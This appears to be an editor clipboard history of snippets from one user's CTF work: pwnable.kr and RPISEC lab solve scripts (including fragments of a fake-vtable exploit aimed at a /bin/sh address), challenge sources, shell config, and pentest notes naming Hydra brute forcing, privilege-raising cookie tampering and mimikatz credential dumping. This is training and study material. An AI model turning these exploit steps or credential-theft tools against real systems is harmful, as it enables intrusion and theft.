a93d2ab9799ae97d8a3c5fe30a84caaa|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|6|1|V|python
	c = 45630493019529458663775342460696105322154565208445812157160063359456332392499981636047963777321986997916374949006763044135070561652251392664004
0aed1fe6776c1d14292685e221cbff40|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|8|1|V|python
	msg = 1364255812281490449958222957851773
2d749a51cc103f696af88f91c263eb00|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|27|13|V|python
	            print(k)
f45d11025dab08c99b2b3e2846cbe4c2|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|7|1|V|python
	msg = 8563572526783509491380413128782881377521413889112217679667059080886589438430105108767400317
e4582e22d0802c4ab24ae3224e6aa89f|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|6|1|V|python
	c = 12120097265289978947461755693181106372674461675333874346782011944195470491672607126658737760367900868406669835240890757660157887931874104639785215688623700843781601946900045779728461564533196078992160442305747696388791445813976276686361407
399356961c7cd495d9aa5d1e3493cad1|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|48|1|V|python
	            k -= 1
f1d9f0ff30329fe5358233faec302d01|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|22|1|V|python
	    for i in range(1, n + 1):
	        if msg >= comb(n - i, k):
	            m[i-1]= '1'
	            msg -= comb(n - i, k)
	            # print(comb(n-i, k))
	            k -= 1
968aa7e8de233e7709ce2ab7a378977a|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|47|1|V|python
	        # print(comb(n-i, k))
789aac382416f8f81f3432b10412c9ad|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|43|1|V|python
	msg = 0
bb0b612eb4dbd93a2c12b1d04250677d|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|45|5|V|python
	    if msg >= comb(n - i, k):
b12d921a04ee75e64f8b40c921d6b094|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|44|1|V|python
	pt = pt[::-1]
f90e2230d6c4bb0d5a9e27fed247619c|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|48|9|V|python
	        print(k)
ed9366ab3323b1f40a80f0efc63c5b6e|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|43|16|v|python
	1,n - 2
e9ab124b314b7003d437b4f330ca52cb|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|44|1|V|python
	    print(i-1)
5c1c25865cb49b13218e79428646ebb2|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|40|1|V|python
	pt = pt[1:]
2ff9f4a5367de94e9185642faae7b643|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|40|1|V|python
	pt = '0' + pt[1:]
371e233f46aa611ac30fd06ac28feb1e|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|57|1|V|python
	    if kappa == 300:
	        print(test)
	        print(msg)
b6c0ab275eba26bfbad1e38e0649357d|file:///home/neo/warzone-rpisec/lab09/9A.py|44|5|V|python
	    r.sendline
c1bb7f7f2ece69cca39af1b5cd926c9a|file:///home/neo/warzone-rpisec/lab09/9A.py|43|1|V|python
	    io.sendlineafter('choice: ', '1')
75697d276efdd51311dc2a2c7352687a|file:///home/neo/warzone-rpisec/lab09/9A.py|44|1|V|python
	    io.sendlineafter('want?: ', str(idx))
a3186a309d94022f5d4ec3a601f4a7c6|file:///home/neo/warzone-rpisec/lab09/9A.py|49|23|v|python
	want
a93dae2ef546e16640f3158bee98b86d|file:///home/neo/warzone-rpisec/lab09/9A.py|49|1|V|python
	    io.sendlineafter('lockbox?: ', str(idx))
76f73b87555e2bc8b538d7a3289d280a|file:///home/neo/warzone-rpisec/lab09/9A.py|50|23|v|python
	lockbox
15505b517b2f2ebc5c3944fc9b5d11fc|file:///home/neo/warzone-rpisec/lab09/9A.py|48|1|V|python
	    io.sendlineafter('choice: ', '2')
b640ade34422471ac44d787544c2661e|file:///home/neo/warzone-rpisec/lab09/9A.py|62|1|V|python
	do_new_set(0, 8)
2838f6dcbea06e078366fafdb2f3579f|file:///home/neo/warzone-rpisec/lab09/9A.py|64|1|V|python
	do_del_set(0)
b3c574252e78df79470181163daf3d99|file:///home/neo/warzone-rpisec/lab09/9A.py|66|1|V|python
	do_new_set(2,4)
05b0ff88426cbccd6ed44aac5417c877|file:///home/neo/warzone-rpisec/lab09/9A.py|53|1|V|python
	    io.sendlineafter('choice: ', '4')
f37daddf1d6ca53b6c66b84bc5e0f8d8|file:///home/neo/warzone-rpisec/lab09/9A.py|56|5|V|python
	def do_find_item(idx, val):
	    io.sendlineafter('choice: ', '4')
446f392261dcb24ec888e01b0fef8f60|file:///home/neo/warzone-rpisec/lab09/9A.py|49|1|V|python
	    io.sendlineafter('lockbox?: ', str(idx))
	    io.sendlineafter('value: ', str(val))
14c74f98aca8ef80396098cca7ce3639|file:///home/neo/warzone-rpisec/lab09/9A.py|77|1|V|python
	do_find_item(0, BINSH_ADDR)
bdadfbe05031c3c29bbcff44101c8a80|file:///home/neo/warzone-rpisec/lab09/9A.py|69|1|V|python
	FAKE_VTABLE = 0x80510b0
4cca02af3b6b6299859233a6921a1386|file:///home/neo/warzone-rpisec/lab09/9A.py|83|15|v|python
	0x80510b0 
97a57645a3f0e1518f8c9f4d340d4c4f|file:///home/neo/warzone-rpisec/lab09/9A.py|82|36|v|python
	encode
4b8c8c40652998c18f7fb39335af0629|file:///home/neo/.zshrc|119|1|V|zsh
	export PATH="$PATH:/usr/local/go/bin"
a9a5de8e216755bb5722f59e34c618a8|file:///home/neo/.zshrc|97|5|V|zsh
	    xset +fp /home/neo/.fonts
	    xset fp rehash
5ca62883d7e7636f9f516e2bcc6f1d06|file:///home/neo/.zshrc|98|1|V|zsh
	xset fp rehash
87d1d8dc38f670e336e15d99e0817e3e|file:///home/neo/.zshrc|97|1|V|zsh
	xset +fp /home/neo/.fonts
348e803d646800ec3ad7ed9602451d92|file:///usr/share/sagemath/bin/sage-python23|14|4|v|sh
	[ "$SAGE_PYTHON3" = yes ]
b334e6730dfb99e12db69a5e5290920e|file:///home/neo/.zshrc|132|1|V|zsh
	# Set Spaceship ZSH as a prompt
	# autoload -U promptinit; promptinit
	# prompt spaceship
	
	# SPACESHIP_PROMPT_ORDER=(
	#     user
	#     dir
	#     git
	# )
	# SPACESHIP_USER_SHOW=true
a8afabc9a4a6b2390201534f9027a289|file:///home/neo/.zshrc|129|109|v|zsh
	/home/neo/.local/lib/python2.7/site-packages
50687cdc4bc36169eb3b2948c9920715|file:///home/neo/cplusplus/chapter11/Multiple.cpp|55|51|v|cpp
	endl
6b250ecdf1198011dceb7145268e6afa|file:///home/neo/cplusplus/chapter11/Multiple.cpp|54|43|v|cpp
	 std::endl;
cc4cef61eb158d768ac1a1ca6dfb0ddf|file:///media/neo/Storage/SageMath/local/lib/python3.7/site-packages/sage/repl/display/fancy_repr.py|20|1|V|python
	    _PrettyPrinterBase,
43ca99b91550e96ef0c9db21c900ec3a|file:///home/neo/pwnablekr/input/input.c|14|1|V|c
	    printf("%s\n", argv['A']);
3636810582dc38ba5f9506751784869d|file:///home/neo/pwnablekr/input/input.c|10|1|V|c
		printf("Just give me correct inputs then you will get the flag :)\n");
be828aaf86b2879a42e412dc8f858726|file:///home/neo/pwnablekr/input/input.c|8|1|V|c
		printf("Welcome to pwnable.kr\n");
b999fff6b5327b6318c30700f42bcc9d|file:///home/neo/pwnablekr/input/input.c|14|1|V|c
	    printf("%d\n", argc);
5c9c21bb6a9f89071181284f1e0cefa1|file:///home/neo/pwnablekr/input/input.c|15|5|V|c
	    printf("%s\n", argv['B']);
f68f7ced90f9ac5c01aaf4031706ad40|file:///home/neo/pwnablekr/input/input.c|17|23|v|c
	\x20\x0a\x0d
b4c589ac322f08992ee1a41bfaeb51b1|file:///home/neo/pwnablekr/input/solve.c|18|5|V|c
	    execve("/home/neo/pwnablekr/input/a.out", args, NULL);
d1aa572c61ba6b4308ae76a8439ddfb5|file:///home/neo/pwnablekr/input/solve.c|35|1|V|c
	        close(pipe_stdin[READ]);
f1ddd91504d12499594774e5e987e28c|file:///home/neo/pwnablekr/input/solve.c|35|9|V|c
	        close(pipe_stdin[READ]);
	        close(pipe_stderr[READ]);
0c93336089e7856d7af4e7d4ac33d473|file:///home/neo/pwnablekr/input/input.c|23|18|v|c
	\x00\x0a\x00\xff
b83479a0efa87b9181a0c36d6c99b69a|file:///home/neo/pwnablekr/input/solve.c|41|1|V|c
	        write(pipe_stdin[WRITE], msg, 4);
c6550424fbec6be430de9c3690a2e662|file:///home/neo/pwnablekr/input/solve.c|39|31|V|c
	        close(pipe_stdin[READ]);
	        close(pipe_stderr[READ]);
	        write(pipe_stdin[WRITE], msg, 4);
	        write(pipe_stderr[WRITE], msg, 4);
	        close(pipe_stdin[WRITE]);
	        close(pipe_stderr[WRITE]);
1539b33192d7a5b26afc67c74e220643|file:///home/neo/pwnablekr/input/solve.c|42|1|V|c
	        close(pipe_stdin[WRITE]);
	        close(pipe_stderr[WRITE]);
888517885105af284d2138a63d77e203|file:///home/neo/pwnablekr/input/solve.c|49|1|V|c
	        dup2(pipe_stdin[READ], 0);
17ef4dbc87049dd42536e5ffccb8b966|file:///home/neo/pwnablekr/input/solve.c|25|16|v|c
	 "\x00\x0a\x00\xff"
d5ccfb6516b74923963520a458977d74|file:///home/neo/pwnablekr/input/solve.c|40|35|v|c
	"\x00\x0a\x00\xff"
c550fb8b83e161dd7989269d49ddd3a0|file:///home/neo/pwnablekr/input/solve.c|42|33|v|c
	  "\x00\x0a\x00\xff"
b1af32d16cdd39f569534daf55044c13|file:///home/neo/pwnablekr/input/solve.c|25|1|V|c
	    char *msg = "\x00\x0a\x00\xff";
768494b6fe498a051383b1e8b890a7d0|file:///home/neo/pwnablekr/input/solve.c|26|5|V|c
	    char *msg = "aaaa";
97f388cc1e29ad2cc9ab4f81f5f36059|file:///home/neo/pwnablekr/input/solve.c|25|1|V|c
	    char *msg_in = "\x00\x0a\x00\xff";
a8fff81e5545f99efa5fa68420fc931f|file:///home/neo/pwnablekr/input/input.c|30|12|v|c
	"\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef")
d5318371ae68092c571a9e8154b63439|file:///home/neo/pwnablekr/input/solve.c|61|34|v|c
	 getenv("
915bcb2a5b4bd222bb56ec2fee71d446|file:///home/neo/pwnablekr/input/solve.c|61|17|v|c
	\xca\xfe\xba\xbe
6e2001ed7e1171c703a8efa7c0156380|file:///home/neo/pwnablekr/input/input.c|31|39|v|c
	"\xde\xad\xbe\xef"
c616d3826732f660feb1c8241eec4226|file:///home/neo/pwnablekr/input/solve.c|61|20|v|c
	\xde\xad\xbe\xef=\xca\xfe\xba\xbe
0c2310fc4d06cb10e781cd278a438026|file:///home/neo/pwnablekr/input/solve.c|62|9|V|c
	        setenv("\xde\xad\xbe\xef", "\xca\xfe\xba\xbe",1);
ca730c6cbb58033357588bc96374f16c|file:///home/neo/pwnablekr/input/input.c|1|1|V|c
	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include <sys/socket.h>
	#include <arpa/inet.h>
ae20da8b15bb55b87c0e87a6015ce2da|file:///home/neo/pwnablekr/input/solve.c|4|1|V|c
	#include <stdio.h>
58d241436624061f412c3dcce5fc8957|file:///home/neo/pwnablekr/input/input.c|36|1|V|c
		FILE* fp = fopen("\x0a", "r");
		if(!fp) return 0;
		if( fread(buf, 4, 1, fp)!=1 ) return 0;
		if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
		fclose(fp);
5df104ad2d015f4ec034f0177fadfb98|file:///home/neo/pwnablekr/input/solve.c|67|35|v|c
	!=1 ) return 0;
4e50dd0ad4b069442cecb4d89fe1d5e3|file:///home/neo/pwnablekr/input/solve.c|68|9|V|c
	        if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
a44cbf4c9ab4f7360756bc019cb3e4ef|file:///home/neo/pwnablekr/input/solve.c|67|16|v|c
	fp, "%c%c%c%c", "\x00", "\x00", "\x00", "\x00"
2f0b5ff59d3a53b41b3ea5cdc5562231|file:///home/neo/pwnablekr/input/input.c|45|1|V|c
		struct sockaddr_in saddr, caddr;
		sd = socket(AF_INET, SOCK_STREAM, 0);
		if(sd == -1){
			printf("socket error, tell admin\n");
			return 0;
		}
		saddr.sin_family = AF_INET;
		saddr.sin_addr.s_addr = INADDR_ANY;
		saddr.sin_port = htons( atoi(argv['C']) );
0462f0a2cefcca7c9f1c2a2449b73204|file:///home/neo/pwnablekr/input/solve.c|76|13|V|c
	            printf("socket error, tell admin\n");
a4fc391ff4a2d200ccc3186957cfdcb7|file:///home/neo/pwnablekr/input/solve.c|82|32|v|c
	 atoi(argv['C']) 
9e999018d09180d9cc08bec2bdc679bb|file:///home/neo/pwnablekr/input/solve.c|71|1|V|c
	
	        int sd;
	        int port = 9999;
	        struct sockaddr_in saddr, caddr;
	        sd = socket(AF_INET, SOCK_STREAM, 0);
	        if(sd == -1){
	            perror("socket");
	            return 0;
	        }
	        saddr.sin_family = AF_INET;
	        saddr.sin_addr.s_addr = INADDR_ANY;
	        saddr.sin_port = htons(port);
	        args['C'] = "9999";
fa246d0262c3925617b0c72bb20eeb1d|file:///home/neo/pwnablekr/input/solve.c|56|20|v|c
	9999
901555fb06e346cb065ceb9808dcfc25|file:///home/neo/pwnablekr/input/solve.c|56|21|v|c
	port
0d0ad59bc44382aa7f7479f01ffac44e|file:///home/neo/pwnablekr/input/solve.c|64|33|v|c
	INADDR_ANY
26323abb075f29a220f11000a2d0e737|file:///home/neo/pwnablekr/input/input.c|66|16|v|c
	 "\xde\xad\xbe\xef"
7353f3cf39f216da0bb413a991d02bed|file:///home/neo/pwnablekr/input/solve.c|66|9|V|c
	        args['C'] = port;
647704533c7b7ae5a1df1d67cf0b6dbf|file:///home/neo/pwnablekr/input/solve.c|56|9|V|c
	        char *port = "9999";
76ca9e5426284b2a17681f8e6afa0e25|file:///home/neo/pwnablekr/input/solve.c|101|17|v|c
	/home/neo/pwnablekr/input/a.out
615dff881fbae4358ea20659e1b9ebda|file:///home/neo/pwnablekr/mistake/mistake.c|17|1|V|c
		if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
ed03be4349cecb92ae9791c720414a26|file:///home/neo/pwnablekr/mistake/mistake.c|18|14|v|c
	/home/mistake/password
8b1b6310944e8916aec307093cc02eea|file:///home/neo/pwnablekr/coin/solve.py|8|1|V|python
	n = params[0].split('=')[1]
a65248ac21a182a6667fbc60d21a0821|file:///home/neo/pwnablekr/coin/solve.py|11|7|V|python
	print(n)
	print(c)
a4f40e2fd35113e9228ac45ae00a74f0|file:///home/neo/pwnablekr/coin/solve.py|11|1|V|python
	n_half = n
b6d495fdadc0151b87751c2c345d38ac|file:///home/neo/pwnablekr/coin/solve.py|14|5|V|python
	    n_half = 
734e3112dcf75777c4d8d539efe02e02|file:///home/neo/pwnablekr/coin/solve.py|22|12|v|python
	half - start
fe01050a3362cb8bf4acc84084131cf3|file:///home/neo/pwnablekr/coin/solve.py|22|11|v|python
	()* 10
ef399b2d446bb37b7c32ad2cc1b6045b|file:///home/neo/pwnablekr/coin/solve.py|23|23|v|python
	stop
377977cb776c4e49c49afa9bcbd46167|file:///home/neo/pwnablekr/coin/solve.py|36|1|V|python
	print(start, stop - 1)
cf3cab006b8c09318d79d5b648328a6c|file:///home/neo/pwnablekr/coin/solve.py|34|20|v|python
	sstarst
c148047b92fc8872410b650654016968|file:///home/neo/pwnablekr/coin/solve.py|36|16|v|python
	stop - 1
949063c3407b4ca503f1f8dc693868af|file:///home/neo/pwnablekr/coin/solve.py|6|1|V|python
	params = r.recvline_contains('N=').decode().split(' ')
	print(params)
	n = int(params[0].split('=')[1])
	c = int(params[1].split('=')[1])
119b7c152c80257e46d93c107a0f525b|file:///home/neo/pwnablekr/coin/solve.py|21|9|V|python
	        expected = (half - start) * 10
a560658e0ccf65a1d944e9de57528574|file:///home/neo/pwnablekr/coin/solve.py|25|19|v|python
	== expected:
4b8f7f5f52f9e5128a1dd1c820182944|file:///home/neo/pwnablekr/coin/solve.py|3|1|V|python
	r = remote('pwnable.kr', 9007)
dda3be2fcda50c0d8b31ac4e638ff27a|file:///home/neo/pwnablekr/coin/solve.py|4|13|v|python
	pwnable.kr
3bbf0169e76d4ba4d49d2ff7900096dc|file:///home/neo/pwnablekr/blackjack/source.c|53|1|V|c
	    printf("\n");
	    printf("\n");
	    printf("\n");
	    printf("\n              222                111                            ");
	    printf("\n            222 222            11111                              ");
	    printf("\n           222   222          11 111                            "); 
	    printf("\n                222              111                               "); 
	    printf("\n               222               111                           ");   
	    printf("\n");
	    printf("\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                ", club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);  
	    printf("\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              ", club, club, spade, spade, diamond, diamond, heart, heart, club, club);            
	    printf("\n%c    %c    %c%c          %c    %c     %c          %c  %c               ", club, club, spade, spade, diamond, diamond, heart, club, club);                        
	    printf("\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              ", club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club);      
	    printf("\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             ", club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club);                       
	    printf("\n%c     %c   %c%c         %c      %c    %c          %c   %c               ", club, club, spade, spade, diamond, diamond, heart, club, club);                                         
	    printf("\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             ", club, club, spade, spade, diamond, diamond, heart, heart, club, club);                                                            
	    printf("\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            ", club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);                                                                                     
	    printf("\n");     
	    printf("\n                        21                                   ");
	     
	    printf("\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                ", diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                     
	    printf("\n        %c%c        %c  %c       %c     %c   %c   %c              ", diamond, diamond, heart, heart, club, club, spade, spade);                                      
	    printf("\n        %c%c       %c    %c     %c          %c  %c               ", diamond, diamond, heart, heart, club, spade, spade);                                           
	    printf("\n        %c%c       %c %c%c %c     %c          %c %c              ", diamond, diamond, heart, heart, heart, heart, club, spade, spade);                                     
	    printf("\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             ", diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade);                                                
	    printf("\n        %c%c      %c      %c    %c          %c   %c               ", diamond, diamond, heart, heart, club, spade, spade);                                                                               
	    printf("\n     %c  %c%c     %c        %c    %c     %c   %c    %c             ", diamond, diamond, diamond, heart, heart, club, spade, spade);                                                                                                               
	    printf("\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            ", diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                                                                                                                                        
	    printf("\n");  
	    printf("\n         222                     111                         ");
	    printf("\n        222                      111                         ");
	    printf("\n       222                       111                         ");
	    printf("\n      222222222222222      111111111111111                       ");
	    printf("\n      2222222222222222    11111111111111111                         ");
	    printf("\n");
	    printf("\n");
c9217fc4023accd68870a72341e395e4|file:///home/neo/pwnablekr/blackjack/source.c|136|1|V|c
	     printf("\n           RULES of VLAD's BLACKJACK");
	     printf("\n          ---------------------------");
	     printf("\nI.");
	     printf("\n     Thou shalt not question the odds of this game.");
	     printf("\n      %c This program generates cards at random.", spade);
	     printf("\n      %c If you keep losing, you are very unlucky!\n", diamond);
	      
	     printf("\nII.");
	     printf("\n     Each card has a value.");
	     printf("\n      %c Number cards 1 to 10 hold a value of their number.", spade);
	     printf("\n      %c J, Q, and K cards hold a value of 10.", diamond);
	     printf("\n      %c Ace cards hold a value of 11", club);
	     printf("\n     The goal of this game is to reach a card value total of 21.\n");
	      
	     printf("\nIII.");
	     printf("\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY.");
	     printf("\n      %c Staying will keep you safe, hitting will add a card.", spade);
	     printf("\n     Because you are competing against the dealer, you must beat his hand.");
	     printf("\n     BUT BEWARE!.");
	     printf("\n      %c If your total goes over 21, you will LOSE!.", diamond);
	     printf("\n     But the world is not over, because you can always play again.\n");
	     printf("\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n", spade, heart, club, club, heart, spade);
f6453e2ae8fc5a33a282aab12f3fdea8|file:///home/neo/pwnablekr/blackjack/source.c|55|1|V|c
	    printf("\n");
	    printf("\n");
430a138311167062ba0d0376bd402f16|file:///home/neo/pwnablekr/blackjack/source.c|146|5|V|c
	            system("cls");
	            asktitle();
3c8b3eeb13f686b19e24afdfff2b38ca|file:///home/neo/pwnablekr/blackjack/source.c|146|1|V|c
	    if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu.
	    { 
	    } // End if loop
	    else if((choice1 == 'N') || (choice1 == 'n')) // If no, convinces user to enter yes
	    {
	        system("cls");
	        printf("\n                 I told you so.\n");
	        asktitle();
	    }
	     
55d6adc403a7695162c83ee021efed3f|file:///home/neo/pwnablekr/blackjack/source.c|156|1|V|c
	    if(k<=9) //If random number is 9 or less, print card with that number
	    {
	    //Club Card
	    printf("-------\n");
	    printf("|%c    |\n", club);
	    printf("|  %d  |\n", k);
	    printf("|    %c|\n", club);
	    printf("-------\n");
	    }
	     
	     
	    if(k==10) //If random number is 10, print card with J (Jack) on face
	    {
	    //Club Card
	    printf("-------\n");
	    printf("|%c    |\n", club);
	    printf("|  J  |\n");
	    printf("|    %c|\n", club);
	    printf("-------\n");
	    }
	     
	     
	    if(k==11) //If random number is 11, print card with A (Ace) on face
	    {
	    //Club Card
	    printf("-------\n");
	    printf("|%c    |\n", club);
	    printf("|  A  |\n");
	    printf("|    %c|\n", club);
	    printf("-------\n");
30d170c0c417bf764d363c95b5752066|file:///home/neo/pwnablekr/blackjack/source.c|156|1|V|c
	    if(k<=9) //If random number is 9 or less, print card with that number
	    {
	    //Club Card
	    printf("-------\n");
	    printf("|%c    |\n", club);
	    printf("|  %d  |\n", k);
	    printf("|    %c|\n", club);
	    printf("-------\n");
	    }
	     
	     
	    if(k==10) //If random number is 10, print card with J (Jack) on face
	    {
	    //Club Card
	    printf("-------\n");
	    printf("|%c    |\n", club);
	    printf("|  J  |\n");
	    printf("|    %c|\n", club);
	    printf("-------\n");
	    }
	     
	     
7cc5103cfa94a3c0fe20604e13c0c3fa|file:///home/neo/pwnablekr/blackjack/source.c|159|1|V|c
	    printf("-------\n");
	    printf("|%c    |\n", club);
	    printf("|  A  |\n");
	    printf("|    %c|\n", club);
	    printf("-------\n");
fa094cafcbaa35430be2307b3269a7f1|file:///home/neo/pwnablekr/blackjack/source.c|167|1|V|c
	    //Club Card
	    printf("-------\n");
	    printf("|%c    |\n", club);
	    printf("|  Q  |\n");
	    printf("|    %c|\n", club);
	    printf("-------\n");
355c205681b9a52da139ff922296301c|file:///home/neo/pwnablekr/blackjack/source.c|173|1|V|c
	    //Club Card
	    printf("-------\n");
	    printf("|%c    |\n", club);
	    printf("|  K  |\n");
	    printf("|    %c|\n", club);
592a93e94cff0e72c0ebbf816ad905c8|file:///home/neo/pwnablekr/blackjack/source.c|173|5|V|c
	    printf("-------\n");
06d3970f6230ba64c80924eda0c07c98|file:///home/neo/pwnablekr/blackjack/source.c|185|1|V|c
	    if(k<=9) //If random number is 9 or less, print card with that number
	    {
	    //Diamond Card
	    printf("-------\n");
	    printf("|%c    |\n", diamond);
	    printf("|  %d  |\n", k);
	    printf("|    %c|\n", diamond);
	    printf("-------\n");
	    }
	     
	    if(k==10) //If random number is 10, print card with J (Jack) on face
	    {
	    //Diamond Card
	    printf("-------\n");
	    printf("|%c    |\n", diamond);
	    printf("|  J  |\n");
	    printf("|    %c|\n", diamond);
	    printf("-------\n");
	    }
	     
a2848f9a718939e9375147147b90e036|file:///home/neo/pwnablekr/blackjack/source.c|187|1|V|c
	    //Diamond Card
	    printf("-------\n");
	    printf("|%c    |\n", diamond);
	    printf("|  A  |\n");
	    printf("|    %c|\n", diamond);
	    printf("-------\n");
bf0eeef38ba740be05d7d7721954ef4a|file:///home/neo/pwnablekr/blackjack/source.c|194|1|V|c
	    //Diamond Card
	    printf("-------\n");
	    printf("|%c    |\n", diamond);
	    printf("|  Q  |\n");
	    printf("|    %c|\n", diamond);
	    printf("-------\n");
cffc45d1f85300202f74899ad49ef844|file:///home/neo/pwnablekr/blackjack/source.c|199|1|V|c
	    //Diamond Card
	    printf("-------\n");
	    printf("|%c    |\n", diamond);
	    printf("|  K  |\n");
	    printf("|    %c|\n", diamond);
	    printf("-------\n");
125f8f6da70786e9f7e2b399744aa885|file:///home/neo/pwnablekr/blackjack/source.c|206|5|V|c
	     
	     
ffe49b181e8861a669cdebaad382ddaa|file:///home/neo/pwnablekr/blackjack/source.c|209|1|V|c
	    if(k<=9) //If random number is 9 or less, print card with that number
	    {
	    //Heart Card
	    printf("-------\n");
	    printf("|%c    |\n", heart); 
	    printf("|  %d  |\n", k);
	    printf("|    %c|\n", heart);
	    printf("-------\n");
	    }
	     
	    if(k==10) //If random number is 10, print card with J (Jack) on face
	    {
	    //Heart Card
	    printf("-------\n");
	    printf("|%c    |\n", heart);
	    printf("|  J  |\n");
	    printf("|    %c|\n", heart);
	    printf("-------\n");
	    }
	     
db89f3290e3b9fbb67adc01dfb7da78b|file:///home/neo/pwnablekr/blackjack/source.c|211|1|V|c
	    //Heart Card
	    printf("-------\n");
	    printf("|%c    |\n", heart);
	    printf("|  A  |\n");
	    printf("|    %c|\n", heart);
	    printf("-------\n");
98d65525e2407f86a5962a6752329e36|file:///home/neo/pwnablekr/blackjack/source.c|218|1|V|c
	    //Heart Card
	    printf("-------\n");
	    printf("|%c    |\n", heart);
	    printf("|  Q  |\n");
	    printf("|    %c|\n", heart);
	    printf("-------\n");
7b7768f35da12e3eb131ddb671ea97b1|file:///home/neo/pwnablekr/blackjack/source.c|223|1|V|c
	    //Heart Card
	    printf("-------\n");
	    printf("|%c    |\n", heart);
	    printf("|  K  |\n");
	    printf("|    %c|\n", heart);
	    printf("-------\n");
594d155d683630a07d301d66bf843561|file:///home/neo/pwnablekr/blackjack/source.c|232|1|V|c
	     
	    if(k<=9) //If random number is 9 or less, print card with that number
	    {
	    //Spade Card
	    printf("-------\n");
	    printf("|%c    |\n", spade);
	    printf("|  %d  |\n", k);
	    printf("|    %c|\n", spade);
	    printf("-------\n");
	    }
	     
	    if(k==10) //If random number is 10, print card with J (Jack) on face
	    {
	    //Spade Card
	    printf("-------\n");
	    printf("|%c    |\n", spade);
	    printf("|  J  |\n");
	    printf("|    %c|\n", spade);
	    printf("-------\n");
	    }
	     
f7de3c0a30b3d7abbefa62c3356597df|file:///home/neo/pwnablekr/blackjack/source.c|234|1|V|c
	    //Spade Card
	    printf("-------\n");
	    printf("|%c    |\n", spade);
	    printf("|  A  |\n");
	    printf("|    %c|\n", spade);
	    printf("-------\n");
aee1c6983c7a7367fa44a10a649e3e74|file:///home/neo/pwnablekr/blackjack/source.c|247|1|V|c
	    //Spade Card
	    printf("-------\n");
	    printf("|%c    |\n", spade);
	    printf("|  Q  |\n");
	    printf("|    %c|\n", spade);
	    printf("-------\n");
7f70a6adf4d43508ff0ee72c16d30e56|file:///home/neo/pwnablekr/blackjack/source.c|252|1|V|c
	    //Spade Card
	    printf("-------\n");
	    printf("|%c    |\n", spade);
	    printf("|  K  |\n");
	    printf("|    %c|\n", spade);
	    printf("-------\n");
8ceb9c3999d97dddae3c89ce9d46b3cd|file:///home/neo/pwnablekr/blackjack/source.c|94|20|V|c
	                                       
84a83f26c8c72e073ea992571f55c7b8|file:///home/neo/pwnablekr/blackjack/source.c|98|17|V|c
	                   break;
9a7adea8cac2058500cb17c4f7debada|file:///home/neo/.zshrc|127|1|V|zsh
	# alias python="ipython"
f110daff57c534bfff54a4c6a3181a57|file:///home/neo/.zshrc|99|1|V|zsh
	# Load zsh-syntax-highlighting; should be last.
	source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh 2>/dev/null
	
9ec804632abdc4aaf65789e7ad11d869|file:///home/neo/vimwiki/Web.wiki|5|1|V|vimwiki
	    * Brute force/weak credentials
	        * Guessing
	        * Hydra
	    * Session management
	        * Manipulate cookie values to change privilage level
	        * Test for usernames: [ https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names ]
837d81094ae074123c146d069fe424cb|file:///home/neo/vimwiki/Web.wiki|7|4|V|vimwiki
	    * Cheat sheet: [ https://owasp.org/www-community/xss-filter-evasion-cheatsheet ]
54d2a649b990def9b8708165935aed68|file:///home/neo/vimwiki/Web.wiki|9|1|V|vimwiki
	    * Parameter manipulation (change parameter value in query)
	    * Directory Traversal 
	    * Forceful browsing
d7f1a429e73bd1cf34f997c37466b298|file:///home/neo/vimwiki/Web.wiki|4|1|V|vimwiki
	== Authentication testing ==
	    
	== XSS ==
	
	== Other ==
372835e88bbd019dfd3439f574316683|file:///home/neo/vimwiki/Metasploit.wiki|11|5|V|vimwiki
	    * Load mimikatz: `load kiwi`
56c6705031c1ffe1cb52a63d9421f468|file:///home/neo/pwnablekr/lotto/lotto.c|44|13|V|c
	            printf("\n");
c76f1e89984067dfc14f76d3f1931036|file:///home/neo/pwnablekr/lotto/lotto.c|40|1|V|c
	            printf("%d ", submit[j]);
